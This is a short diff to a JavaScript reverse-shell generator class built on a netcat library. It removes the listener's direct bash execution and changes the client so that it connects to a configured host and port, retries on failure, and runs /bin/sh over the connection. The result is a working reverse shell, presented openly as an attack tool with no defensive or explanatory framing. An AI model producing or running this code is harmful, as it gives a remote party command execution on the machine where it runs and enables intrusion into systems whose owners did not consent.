@@ -1,14 +1,13 @@
 import netcat from 'netcat'
 
 class ReverseShellGenerator {
-    constructor({ host, port, command }) {
+    constructor({ host, port }) {
         this.host = host;
         this.port = port;
-        this.command = command || '/bin/bash';
     }
 
     listener() {
-        const listener_code = `server.port(${this.port}).listen().exec('/bin/bash')`
+        const listener_code = `server.k().port(${this.port}).listen().serve(process.stdin).pipe(process.stdout)`
         const encoded_listener_code = Buffer.from(listener_code).toString('base64');
         const code = `import netcat from 'netcat'
 const server = new netcat.server()
@@ -30,7 +29,7 @@ Listener.start()\n`
 
     runLocalClient() {
         const client = new netcat.client()
-        process.stdin.pipe( client.addr('${this.host}').port(${this.port}).connect().pipe(process.stdout).stream())
+        client.addr(this.host).port(this.port).retry(5000).connect().exec('/bin/sh')
     }
 }
 
